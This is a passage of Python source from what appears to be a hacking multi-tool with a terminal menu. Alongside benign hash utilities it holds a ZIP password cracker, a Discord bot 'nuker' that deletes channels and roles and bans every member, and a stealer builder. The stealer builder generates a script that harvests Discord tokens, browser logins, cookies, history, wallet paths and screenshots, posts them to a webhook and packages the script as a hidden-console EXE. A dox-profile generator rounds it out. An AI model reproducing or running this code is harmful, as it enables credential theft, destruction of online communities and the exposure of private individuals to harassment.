                    "User-Agent": "CheapyTool/1.0",
                    "Accept": "application/json",
                },
                timeout=10,
            )
            if r.status_code == 200:
                data = r.json().get("data", {})
                score = data.get("abuseConfidenceScore", 0)
                if score > 0:
                    warning(f"AbuseIPDB confidence score: [bold {Theme.amber}]{score}%[/]")
                    info(f"ISP: {data.get('isp', 'N/A')}")
                    info(f"Domain: {data.get('domain', 'N/A')}")
                    info(f"Country: {data.get('countryCode', 'N/A')}")
                    t2 = make_table("AbuseIPDB Reports", ["Report", "Value"])
                    t2.add_row("Total reports", str(data.get("totalReports", 0)))
                    t2.add_row("Last reported", data.get("lastReportedAt", "N/A"))
                    console.print(t2)
                else:
                    success("AbuseIPDB: clean")
            else:
                warning(f"AbuseIPDB returned {r.status_code}")
        except Exception as e:
            info(f"AbuseIPDB skipped: {e}")

        result = len(listed_on)
        if result == 0:
            success("IP is clean on all checked blocklists")
        elif result < 3:
            warning(f"Listed on {result} blocklist(s)")
        else:
            error(f"Listed on {result} blocklist(s)")

    # ─── HASH IDENTIFIER ─────────────────────────────

    HASH_PATTERNS = [
        (8, "CRC32", "medium"),
        (13, "DES (Unix crypt)", "high"),
        (16, "MySQL 3.x / DES (half)", "medium"),
        (24, "MD5 (base64)", "medium"),
        (32, "MD4 / MD5 / NTLM / RIPEMD-128 / Haval-128", "high"),
        (40, "SHA1 / SHA0 / RIPEMD-160 / Haval-160 / SHA-1", "high"),
        (44, "SHA256 (base64)", "medium"),
        (48, "Tiger-192 / Haval-192", "medium"),
        (56, "SHA-224 / SHA3-224 / Haval-224", "high"),
        (64, "SHA-256 / SHA3-256 / RIPEMD-256 / BLAKE2s-256 / Haval-256", "high"),
        (88, "SHA512 (base64)", "medium"),
        (96, "SHA-384 / SHA3-384 / Haval-384", "high"),
        (128, "SHA-512 / Whirlpool / BLAKE2b-512 / SHA3-512 / RIPEMD-512", "high"),
    ]

    def hash_identifier(self):
        h = get_input("Hash string").strip()
        if not h:
            return

        t = make_table("Hash Identification", ["Hash Type", "Confidence"])
        matched = False

        if h.startswith("$2a$") or h.startswith("$2b$") or h.startswith("$2y$"):
            t.add_row("Bcrypt", "high")
            matched = True
        if h.startswith("$1$"):
            t.add_row("MD5 Crypt", "high")
            matched = True
        if h.startswith("$5$"):
            t.add_row("SHA-256 Crypt", "high")
            matched = True
        if h.startswith("$6$"):
            t.add_row("SHA-512 Crypt", "high")
            matched = True
        if h.startswith("$argon2"):
            t.add_row("Argon2", "high")
            matched = True
        if h.startswith("$pbkdf2"):
            t.add_row("PBKDF2", "high")
            matched = True
        if ":" in h and re.match(r"^[a-f0-9]{32}:[a-zA-Z0-9]+$", h, re.I):
            t.add_row("NTLM (with username)", "high")
            matched = True

        if re.match(r"^[a-f0-9]+$", h, re.I):
            for length, name, conf in self.HASH_PATTERNS:
                if len(h) == length:
                    t.add_row(name, conf)
                    matched = True

        if not matched:
            info("Could not identify hash type")
            info(f"Length: {len(h)} characters")
            info(f"Hex: {bool(re.match(r'^[a-f0-9]+$', h, re.I))}")
        else:
            console.print(t)
            info(f"Hash length: {len(h)}")

    # ─── FILE HASHER ─────────────────────────────────

    def file_hasher(self):
        path = get_input("File path")
        path = path.strip('"').strip("'")
        if not os.path.isfile(path):
            error("File not found")
            return
        try:
            size = os.path.getsize(path)
            size_str = f"{size:,} bytes"
            if size > 1024 * 1024:
                size_str += f" ({size / (1024*1024):.2f} MB)"
            elif size > 1024:
                size_str += f" ({size / 1024:.2f} KB)"

            wait_msg(f"Hashing {os.path.basename(path)}...")
            md5 = hashlib.md5()
            sha1 = hashlib.sha1()
            sha256 = hashlib.sha256()
            sha512 = hashlib.sha512()

            with open(path, "rb") as f:
                while True:
                    chunk = f.read(65536)
                    if not chunk:
                        break
                    md5.update(chunk)
                    sha1.update(chunk)
                    sha256.update(chunk)
                    sha512.update(chunk)

            t = make_table("File Hashes", ["Algorithm", "Hash"])
            t.add_row("Filename", os.path.basename(path))
            t.add_row("Size", size_str)
            t.add_row("MD5", md5.hexdigest())
            t.add_row("SHA1", sha1.hexdigest())
            t.add_row("SHA256", sha256.hexdigest())
            t.add_row("SHA512", sha512.hexdigest())
            console.print(t)

        except Exception as e:
            error(f"Hashing failed: {e}")

    # ─── ZIP PASSWORD CRACKER ────────────────────────

    def zip_cracker(self):
        path = get_input("ZIP file path")
        path = path.strip('"').strip("'")
        if not os.path.isfile(path):
            error("File not found")
            return

        try:
            zf = zipfile.ZipFile(path, "r")
        except zipfile.BadZipFile:
            error("Invalid ZIP file")
            return

        if not zf.namelist():
            error("Empty ZIP file")
            zf.close()
            return

        console.print()
        choice = get_input("Use (w)ordlist file or (s)ingle password?", "w").strip().lower()

        passwords = []
        if choice == "s":
            pwd = get_input("Password to test")
            if pwd:
                passwords.append(pwd)
        else:
            wl_path = get_input("Wordlist file path")
            wl_path = wl_path.strip('"').strip("'")
            if not os.path.isfile(wl_path):
                error("Wordlist not found")
                zf.close()
                return
            try:
                with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        p = line.strip()
                        if p:
                            passwords.append(p)
                success(f"Loaded {len(passwords)} passwords")
            except Exception as e:
                error(f"Failed to read wordlist: {e}")
                zf.close()
                return

        if not passwords:
            error("No passwords to try")
            zf.close()
            return

        console.print()
        found = None
        total = len(passwords)
        for i, pwd in enumerate(passwords):
            if i % 100 == 0:
                console.print(f"  [{Theme.gold3}]Trying {i+1}/{total}...[/]", end="\r")
            try:
                zf.extractall(pwd=pwd.encode() if isinstance(pwd, str) else pwd)
                found = pwd
                console.print(" " * 60, end="\r")
                break
            except (RuntimeError, zipfile.BadZipFile):
                continue
            except Exception:
                continue

        zf.close()
        if found:
            success(f"Password found: [bold {Theme.gold1}]{found}[/]")
        else:
            warning("Password not found in wordlist")

    # ─── PYTHON OBFUSCATOR ──────────────────────────

    def python_obfuscator(self):
        path = get_input("Python file to obfuscate")
        path = path.strip('"').strip("'")
        if not os.path.isfile(path):
            error("File not found")
            return

        try:
            with open(path, "r", encoding="utf-8") as f:
                source = f.read()
        except Exception as e:
            error(f"Failed to read file: {e}")
            return

        wait_msg("Obfuscating...")
        source_bytes = source.encode("utf-8")
        encoded = base64.b64encode(source_bytes).decode()
        var_name = "_" + "".join(random.choices(string.ascii_letters, k=8))
        obfuscated = (
            f'import base64\n'
            f'{var_name} = base64.b64decode("{encoded}")\n'
            f'exec({var_name}.decode("utf-8"))\n'
        )

        out_name = os.path.splitext(os.path.basename(path))[0] + "_obfuscated.py"
        out_path = os.path.join(os.path.dirname(path) or ".", out_name)
        try:
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(obfuscated)
            success(f"Obfuscated script saved: [bold {Theme.gold1}]{out_path}[/]")
            info("Add more layers or a packer for better protection")
        except Exception as e:
            error(f"Failed to save: {e}")

    # ─── DISCORD TOKEN GENERATOR ────────────────────

    def discord_token_gen(self):
        count_str = get_input("Number of tokens to generate", "10")
        try:
            count = int(count_str)
        except ValueError:
            count = 10
        count = max(1, min(count, 1000))

        token_chars = string.ascii_letters + string.digits + "-_"
        tokens = []
        for _ in range(count):
            p1 = "".join(random.choices(token_chars, k=random.randint(24, 26)))
            p2 = "".join(random.choices(token_chars, k=6))
            p3 = "".join(random.choices(token_chars, k=38))
            tokens.append(f"{p1}.{p2}.{p3}")

        t = make_table(f"Generated Tokens ({count})", ["#", "Token"])
        for i, tok in enumerate(tokens, 1):
            masked = tok[:15] + "..." + tok[-10:] if len(tok) > 30 else tok
            t.add_row(str(i), masked)
        console.print(t)

        if count <= 20:
            console.print()
            for tok in tokens:
                console.print(f"  [{Theme.muted_text}]{tok}[/]")

        console.print()
        info("These are randomly generated strings matching token format")
        warning("Most will be invalid. Use a checker to validate.")

    # ─── DISCORD TOKEN JOINER ───────────────────────

    def discord_token_joiner(self):
        token = get_input("Discord token").strip()
        invite = get_input("Server invite code (e.g. 'discord' from discord.gg/discord)").strip()
        invite = invite.split("/")[-1].split(".")[-1]

        wait_msg(f"Joining with invite {invite}...")
        try:
            r = requests.post(
                f"https://discord.com/api/v9/invites/{invite}",
                headers={
                    "Authorization": token,
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/json",
                },
                json={},
                timeout=10,
            )
            if r.status_code == 200:
                data = r.json()
                guild = data.get("guild", {})
                success(f"Joined [bold {Theme.gold1}]{guild.get('name', 'server')}[/]")
                info(f"Guild ID: {guild.get('id', 'N/A')}")
            elif r.status_code == 401:
                error("Invalid token")
            elif r.status_code == 404:
                error("Invalid invite")
            elif r.status_code == 429:
                warning(f"Rate limited. Try again later.")
            elif r.status_code == 403:
                error("Cannot join - possibly already in server or banned")
            else:
                error(f"Failed: {r.status_code}")
        except Exception as e:
            error(f"Error: {e}")

    # ─── DISCORD BOT NUKER ──────────────────────────

    def discord_bot_nuker(self):
        bot_token = get_input("Bot token").strip()
        console.print()

        info("Select nuke action:")
        console.print(f"  [{Theme.gold2}]1[/] Delete all channels")
        console.print(f"  [{Theme.gold2}]2[/] Ban all members")
        console.print(f"  [{Theme.gold2}]3[/] Delete all roles")
        console.print(f"  [{Theme.gold2}]4[/] Full nuke (all of the above)")
        choice = get_input("Choice [1-4]", "4").strip()
        delay_str = get_input("Delay between actions (seconds)", "0.5").strip()
        try:
            delay = max(0.1, float(delay_str))
        except ValueError:
            delay = 0.5

        headers = {
            "Authorization": f"Bot {bot_token}",
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json",
        }

        wait_msg("Fetching guilds...")
        try:
            r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=10)
            if r.status_code != 200:
                error(f"Invalid bot token or no access ({r.status_code})")
                return
            guilds = r.json()
        except Exception as e:
            error(f"Failed: {e}")
            return

        for guild in guilds:
            gid = guild["id"]
            gname = guild.get("name", "Unknown")
            section_header(f"Nuking: {gname}")
            time.sleep(delay)

            if choice in ("1", "4"):
                try:
                    r = requests.get(f"https://discord.com/api/v9/guilds/{gid}/channels", headers=headers, timeout=10)
                    channels = r.json()
                    for ch in channels:
                        try:
                            requests.delete(
                                f"https://discord.com/api/v9/channels/{ch['id']}",
                                headers=headers,
                                timeout=10,
                            )
                            info(f"Deleted channel: {ch.get('name', 'N/A')}")
                            time.sleep(delay)
                        except Exception:
                            pass
                except Exception as e:
                    error(f"Channel deletion failed: {e}")

            if choice in ("2", "4"):
                try:
                    after = None
                    while True:
                        params = {"limit": 1000}
                        if after:
                            params["after"] = after
                        r = requests.get(
                            f"https://discord.com/api/v9/guilds/{gid}/members",
                            headers=headers,
                            params=params,
                            timeout=10,
                        )
                        if r.status_code != 200:
                            break
                        members = r.json()
                        if not members:
                            break
                        for m in members:
                            if m.get("user", {}).get("bot"):
                                continue
                            uid = m["user"]["id"]
                            try:
                                requests.put(
                                    f"https://discord.com/api/v9/guilds/{gid}/bans/{uid}",
                                    headers=headers,
                                    json={"delete_message_seconds": 0},
                                    timeout=10,
                                )
                                info(f"Banned: {m['user'].get('username', uid)}")
                                time.sleep(delay)
                            except Exception:
                                pass
                        after = members[-1]["user"]["id"]
                except Exception as e:
                    error(f"Ban failed: {e}")

            if choice in ("3", "4"):
                try:
                    r = requests.get(f"https://discord.com/api/v9/guilds/{gid}/roles", headers=headers, timeout=10)
                    roles = r.json()
                    for role in roles:
                        if role["name"] == "@everyone" or role.get("managed"):
                            continue
                        try:
                            requests.delete(
                                f"https://discord.com/api/v9/guilds/{gid}/roles/{role['id']}",
                                headers=headers,
                                timeout=10,
                            )
                            info(f"Deleted role: {role.get('name', 'N/A')}")
                            time.sleep(delay)
                        except Exception:
                            pass
                except Exception as e:
                    error(f"Role deletion failed: {e}")

            if choice == "4":
                try:
                    requests.delete(
                        f"https://discord.com/api/v9/users/@me/guilds/{gid}",
                        headers=headers,
                        timeout=10,
                    )
                    success(f"Left guild: {gname}")
                except Exception:
                    pass

        console.print()
        success("Nuke actions completed")

    # ─── DISCORD SERVER CLONER ──────────────────────

    def discord_server_cloner(self):
        token = get_input("User token").strip()
        source_id = get_input("Source server ID").strip()
        target_id = get_input("Target server ID").strip()

        headers = {
            "Authorization": token,
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json",
        }

        wait_msg("Fetching source server info...")
        try:
            r = requests.get(f"https://discord.com/api/v9/guilds/{source_id}", headers=headers, timeout=10)
            if r.status_code != 200:
                error(f"Failed to fetch source ({r.status_code})")
                return
            source = r.json()
        except Exception as e:
            error(f"Error: {e}")
            return

        src_name = source.get("name", "Unknown")
        section_header(f"Cloning: {src_name} -> {target_id}")

        info("Deleting target channels...")
        try:
            r = requests.get(f"https://discord.com/api/v9/guilds/{target_id}/channels", headers=headers, timeout=10)
            target_channels = r.json()
            for ch in target_channels:
                try:
                    requests.delete(f"https://discord.com/api/v9/channels/{ch['id']}", headers=headers, timeout=10)
                    time.sleep(0.3)
                except Exception:
                    pass
        except Exception as e:
            error(f"Failed to delete channels: {e}")

        info("Cloning roles...")
        try:
            r = requests.get(f"https://discord.com/api/v9/guilds/{source_id}/roles", headers=headers, timeout=10)
            src_roles = r.json()
            for role in reversed(src_roles):
                if role["name"] == "@everyone" or role.get("managed"):
                    continue
                payload = {
                    "name": role["name"],
                    "permissions": role["permissions"],
                    "color": role["color"],
                    "hoist": role.get("hoist", False),
                    "mentionable": role.get("mentionable", False),
                }
                try:
                    requests.post(
                        f"https://discord.com/api/v9/guilds/{target_id}/roles",
                        headers=headers, json=payload, timeout=10,
                    )
                    time.sleep(0.3)
                except Exception:
                    pass
        except Exception as e:
            error(f"Role cloning failed: {e}")

        info("Cloning channels...")
        cat_map = {}
        try:
            r = requests.get(f"https://discord.com/api/v9/guilds/{source_id}/channels", headers=headers, timeout=10)
            src_channels = r.json()

            for ch in src_channels:
                if ch["type"] == 4:
                    payload = {
                        "name": ch["name"],
                        "type": 4,
                        "permission_overwrites": ch.get("permission_overwrites", []),
                    }
                    try:
                        r2 = requests.post(
                            f"https://discord.com/api/v9/guilds/{target_id}/channels",
                            headers=headers, json=payload, timeout=10,
                        )
                        if r2.status_code in (200, 201):
                            cat_map[ch["id"]] = r2.json().get("id")
                        time.sleep(0.3)
                    except Exception:
                        pass

            for ch in src_channels:
                if ch["type"] == 4:
                    continue
                payload = {
                    "name": ch["name"],
                    "type": ch.get("type", 0),
                    "permission_overwrites": ch.get("permission_overwrites", []),
                    "topic": ch.get("topic", ""),
                    "nsfw": ch.get("nsfw", False),
                    "rate_limit_per_user": ch.get("rate_limit_per_user", 0),
                    "parent_id": cat_map.get(ch.get("parent_id", "")) if ch.get("parent_id") else None,
                }
                if payload["parent_id"] is None:
                    del payload["parent_id"]
                try:
                    requests.post(
                        f"https://discord.com/api/v9/guilds/{target_id}/channels",
                        headers=headers, json=payload, timeout=10,
                    )
                    time.sleep(0.3)
                except Exception:
                    pass
        except Exception as e:
            error(f"Channel cloning failed: {e}")

        info("Cloning server icon...")
        try:
            icon_hash = source.get("icon")
            if icon_hash:
                ext = "gif" if icon_hash.startswith("a_") else "png"
                icon_url = f"https://cdn.discordapp.com/icons/{source_id}/{icon_hash}.{ext}"
                r = requests.get(icon_url, timeout=10)
                if r.status_code == 200:
                    b64_icon = base64.b64encode(r.content).decode()
                    data_uri = f"data:image/{ext};base64,{b64_icon}"
                    requests.patch(
                        f"https://discord.com/api/v9/guilds/{target_id}",
                        headers=headers,
                        json={"icon": data_uri, "name": src_name},
                        timeout=10,
                    )
        except Exception:
            pass

        console.print()
        success(f"Server cloning complete!")
        warning("Note: some features may not clone perfectly")

    # ─── DISCORD INJECTION CLEANER ──────────────────

    DISCORD_PATHS = [
        os.path.expandvars(r"%LOCALAPPDATA%\Discord"),
        os.path.expandvars(r"%LOCALAPPDATA%\DiscordPTB"),
        os.path.expandvars(r"%LOCALAPPDATA%\DiscordCanary"),
        os.path.expandvars(r"%LOCALAPPDATA%\DiscordDevelopment"),
    ]

    INJECTION_MARKERS = ["_0xW", "dQw4w9WgXcQ", "wSend", "capToken"]

    def discord_injection_cleaner(self):
        if platform.system() != "Windows":
            error("This tool is Windows-only")
            return

        console.print()
        warning("This will scan Discord installations for token injection")
        info("Checking Discord client directories...")
        console.print()

        cleaned = 0
        for dpath in self.DISCORD_PATHS:
            if not os.path.isdir(dpath):
                continue
            core_dir = os.path.join(dpath, "app-*", "modules", "discord_desktop_core-*")
            matches = sorted(_glob.glob(os.path.join(dpath, "app-*", "modules", "discord_desktop_core-*")))
            for core_path in matches:
                index_js = os.path.join(core_path, "discord_desktop_core", "index.js")
                if not os.path.isfile(index_js):
                    continue
                try:
                    with open(index_js, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                    if any(marker in content for marker in self.INJECTION_MARKERS):
                        bak_path = index_js + ".bak"
                        if os.path.isfile(bak_path):
                            with open(bak_path, "r", encoding="utf-8") as bf:
                                bak_content = bf.read()
                            with open(index_js, "w", encoding="utf-8") as f:
                                f.write(bak_content)
                            success(f"Restored from backup: {core_path}")
                        else:
                            clean = content.split("module.exports")[0]
                            clean += "\nmodule.exports = require('./core.asar');\n"
                            with open(index_js, "w", encoding="utf-8") as f:
                                f.write(clean)
                            success(f"Injection stripped: {core_path}")
                        cleaned += 1
                    else:
                        info(f"Clean: {core_path}")
                except Exception as e:
                    error(f"Failed to process {core_path}: {e}")

        if cleaned == 0:
            info("No Discord injections found")
        else:
            success(f"Cleaned {cleaned} injection(s)")
            info("Restart Discord for changes to take effect")

    # ─── STEALER BUILDER ────────────────────────────

    def stealer_builder(self):
        console.print(Panel(
            Text(" EDUCATIONAL USE ONLY — For security research and awareness ", style=f"bold {Theme.amber}"),
            border_style=Theme.amber,
            box=box.HEAVY,
        ))
        console.print()

        features = {
            "1": ("System Info", True),
            "2": ("Discord Tokens", True),
            "3": ("Browser Passwords", False),
            "4": ("Browser Cookies", False),
            "5": ("Browser History", False),
            "6": ("Wallets", False),
            "7": ("Screenshot", False),
        }

        console.print(Text("Select features (comma-separated, e.g. 1,2,5):", style=f"bold {Theme.gold1}"))
        for fid, (fname, fdefault) in features.items():
            status = f"[bold {Theme.gold2}]ON[/]" if fdefault else f"[{Theme.muted_text}]OFF[/]"
            console.print(f"  {fid}. {fname} {status}")

        sel = get_input("Feature selection", "1,2").strip()

        webhook = get_input("Discord webhook URL (required)", "").strip()
        if not webhook:
            warning("No webhook provided — data will be printed to console instead")
            console.print()

        output = f"""#!/usr/bin/env python3
# Educational security tool — do not use maliciously
import base64, json, os, platform, shutil, sqlite3, subprocess, sys, tempfile, threading
from datetime import datetime

try:
    import requests
except ImportError:
    os.system(f"{{sys.executable}} -m pip install requests")
    import requests

WEBHOOK_URL = "{webhook}"

def send(data: str):
    if not WEBHOOK_URL:
        print("[DATA]", data)
        return
    try:
        requests.post(WEBHOOK_URL, json={{"content": data[:1900]}}, timeout=10)
    except Exception:
        pass

results = []
"""
        sel_features = [s.strip() for s in sel.split(",")]

        if "1" in sel_features:
            output += """
# System Info
try:
    info = {"pc": platform.node(), "os": platform.platform(),
            "user": os.getenv("USERNAME") or os.getenv("USER"),
            "cpu": platform.processor()}
    results.append(f"System: {info}")
except Exception:
    pass
"""
        if "2" in sel_features:
            output += """
# Discord Tokens (basic)
discord_paths = []
for base in [os.getenv("LOCALAPPDATA"), os.getenv("APPDATA")]:
    for root, dirs, files in os.walk(base or ""):
        for f in files:
            if f.endswith(".ldb") or f.endswith(".log"):
                if "discord" in root.lower() and "Local Storage" in root:
                    discord_paths.append(os.path.join(root, f))
for path in discord_paths:
    try:
        with open(path, "r", errors="ignore") as f:
            content = f.read()
        tokens = [t for t in content.split('"') if len(t) > 50 and "." in t and t.count(".") >= 2]
        for t in tokens[:5]:
            results.append(f"Token: {t[:20]}...")
    except Exception:
        pass
"""
        if "3" in sel_features:
            output += """
# Browser Passwords (Chrome/Edge)
for browser in ["Chrome", "Edge", "BraveSoftware"]:
    login_path = os.path.join(os.getenv("LOCALAPPDATA") or "", browser, "User Data", "Default", "Login Data")
    if os.path.isfile(login_path):
        try:
            shutil.copy2(login_path, "tmp_login.db")
            conn = sqlite3.connect("tmp_login.db")
            for row in conn.execute("SELECT origin_url, username_value FROM logins"):
                results.append(f"Password: {row[0]} | {row[1]}")
            conn.close()
            os.remove("tmp_login.db")
        except Exception:
            pass
"""
        if "4" in sel_features:
            output += """
# Browser Cookies (basic)
cookie_dirs = []
for browser in ["Chrome", "Edge", "BraveSoftware"]:
    cd = os.path.join(os.getenv("LOCALAPPDATA") or "", browser, "User Data", "Default", "Network")
    if os.path.isdir(cd):
        cookie_dirs.append(cd)
for cd in cookie_dirs:
    try:
        shutil.copy2(os.path.join(cd, "Cookies"), "tmp_cookies.db")
        conn = sqlite3.connect("tmp_cookies.db")
        for row in conn.execute("SELECT host_key, name FROM cookies LIMIT 20"):
            results.append(f"Cookie: {row[0]} | {row[1]}")
        conn.close()
        os.remove("tmp_cookies.db")
    except Exception:
        pass
"""
        if "5" in sel_features:
            output += """
# Browser History (basic)
for browser in ["Chrome", "Edge", "BraveSoftware"]:
    hist_path = os.path.join(os.getenv("LOCALAPPDATA") or "", browser, "User Data", "Default", "History")
    if os.path.isfile(hist_path):
        try:
            shutil.copy2(hist_path, "tmp_hist.db")
            conn = sqlite3.connect("tmp_hist.db")
            for row in conn.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 20"):
                results.append(f"History: {row[0]} | {row[1]}")
            conn.close()
            os.remove("tmp_hist.db")
        except Exception:
            pass
"""
        if "6" in sel_features:
            output += """
# Wallet paths
wallet_paths = [
    os.path.join(os.getenv("APPDATA") or "", "Exodus", "exodus.wallet"),
    os.path.join(os.getenv("APPDATA") or "", "Electrum", "wallets"),
    os.path.join(os.getenv("LOCALAPPDATA") or "", "binance", "Binance.dll"),
]
for wp in wallet_paths:
    if os.path.isfile(wp) or os.path.isdir(wp):
        results.append(f"Wallet: {wp}")
"""
        if "7" in sel_features:
            output += """
# Screenshot
try:
    import PIL.ImageGrab as ig
    ss = ig.grab()
    ss.save("screenshot.png")
    results.append("Screenshot: captured")
except Exception:
    try:
        import mss
        with mss.mss() as sct:
            sct.shot(output="screenshot.png")
        results.append("Screenshot: captured (mss)")
    except Exception:
        pass
"""
        output += """
# Send results
if results:
    msg = "**Stealer Report**\\n" + "\\n".join(results[:50])
    send(msg)
else:
    send("Stealer: no data collected")
"""

        out_name = get_input("Output filename", "stealer_output.py").strip()
        if not out_name.endswith(".py"):
            out_name += ".py"
        out_path = os.path.join(OUTPUT_DIR, out_name)
        try:
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(output)
            success(f"Stealer script saved: [bold {Theme.gold1}]{out_path}[/]")
        except Exception as e:
            error(f"Failed to save: {e}")

        if confirm("Compile to EXE with PyInstaller?"):
            exe_name = out_name.replace(".py", "")
            info("Installing PyInstaller if needed...")
            subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], capture_output=True)
            info(f"Compiling [bold {Theme.gold1}]{out_name}[/] to EXE...")
            result = subprocess.run(
                [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole",
                 "--name", exe_name, "--distpath", str(OUTPUT_DIR), str(out_path)],
                capture_output=True, text=True,
            )
            if result.returncode == 0:
                exe_path = os.path.join(OUTPUT_DIR, f"{exe_name}.exe")
                if os.path.isfile(exe_path):
                    success(f"EXE built: [bold {Theme.gold1}]{exe_path}[/]")
                else:
                    success(f"EXE built in: [bold {Theme.gold1}]{OUTPUT_DIR}[/]")
            else:
                error(f"PyInstaller failed:\n{result.stderr[:500]}")
            import shutil
            build_dir = os.path.join(os.getcwd(), "build")
            spec_file = os.path.join(os.getcwd(), f"{exe_name}.spec")
            if os.path.isdir(build_dir):
                shutil.rmtree(build_dir, ignore_errors=True)
            if os.path.isfile(spec_file):
                os.remove(spec_file)

    # ─── DOX CREATOR ────────────────────────────────

    def dox_creator(self):
        console.print(Panel(
            Text(" DOX Creator — Fill in fields (Enter to skip) ", style=f"bold {Theme.amber}"),
            border_style=Theme.amber,
            box=box.HEAVY,
        ))
        console.print()

        d = {}
        section_header("Identity")
        d["first_name"] = get_input("First name")
        d["last_name"] = get_input("Last name")
        d["gender"] = get_input("Gender")
        d["dob"] = get_input("Date of birth")
        d["age"] = get_input("Age")

        section_header("Contact")
        d["email"] = get_input("Email address")
        d["phone"] = get_input("Phone number")
        d["discord"] = get_input("Discord username")
        d["twitter"] = get_input("Twitter/X handle")
        d["instagram"] = get_input("Instagram handle")

        section_header("Location")
        d["ip"] = get_input("IP address (for auto-geo)")
        if d["ip"]:
            try:
                r = requests.get(f"http://ip-api.com/json/{d['ip']}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query", timeout=10)
                geo = r.json()
                if geo.get("status") == "success":
                    d["country"] = geo.get("country", "")
                    d["state"] = geo.get("regionName", "")
                    d["city"] = geo.get("city", "")
                    d["zip"] = geo.get("zip", "")
                    d["isp"] = geo.get("isp", "")
                    d["org"] = geo.get("org", "")
                    d["asn"] = geo.get("as", "")
                    success("IP geolocation data filled")
            except Exception:
                pass
        if not d.get("country"):
            d["country"] = get_input("Country")
        if not d.get("state"):
            d["state"] = get_input("State/Region")
        if not d.get("city"):
            d["city"] = get_input("City")
        d["address"] = get_input("Street address")
        d["zip"] = d.get("zip") or get_input("ZIP code")

        section_header("Online")
        d["username"] = get_input("Username")
        d["website"] = get_input("Website/URL")

        d["notes"] = get_input("Additional notes")

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        label = f"{d.get('first_name', 'Unknown')}_{d.get('last_name', 'Person')}".replace(" ", "_")
        if label in ("Unknown_Person",):
            label = f"dox_{random.randint(1000, 9999)}"

        template = f"""
{'=' * 60}
  DOX PROFILE — Generated {timestamp}
{'=' * 60}

  FIRST NAME : {d.get('first_name', 'N/A')}
  LAST NAME  : {d.get('last_name', 'N/A')}
  GENDER     : {d.get('gender', 'N/A')}
  DOB        : {d.get('dob', 'N/A')}
  AGE        : {d.get('age', 'N/A')}

  EMAIL      : {d.get('email', 'N/A')}
  PHONE      : {d.get('phone', 'N/A')}
  DISCORD    : {d.get('discord', 'N/A')}
  TWITTER    : {d.get('twitter', 'N/A')}
  INSTAGRAM  : {d.get('instagram', 'N/A')}

  IP         : {d.get('ip', 'N/A')}
  COUNTRY    : {d.get('country', 'N/A')}
  STATE      : {d.get('state', 'N/A')}
  CITY       : {d.get('city', 'N/A')}
  ADDRESS    : {d.get('address', 'N/A')}
  ZIP        : {d.get('zip', 'N/A')}
  ISP        : {d.get('isp', 'N/A')}
  ORG        : {d.get('org', 'N/A')}
  ASN        : {d.get('asn', 'N/A')}

  USERNAME   : {d.get('username', 'N/A')}
  WEBSITE    : {d.get('website', 'N/A')}

  NOTES      : {d.get('notes', 'N/A')}

{'=' * 60}
"""

        console.print()
        success("DOX Profile Generated:")
        console.print(Text(template, style=Theme.gold2))

        save = get_input("Save to file?", "y").strip().lower()
        if save in ("y", "yes", "ok"):
            out_path = OUTPUT_DIR / f"dox_{label}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            try:
                with open(out_path, "w", encoding="utf-8") as f:
                    f.write(template)
                success(f"Saved: [bold {Theme.gold1}]{out_path}[/]")
            except Exception as e:
                error(f"Failed to save: {e}")
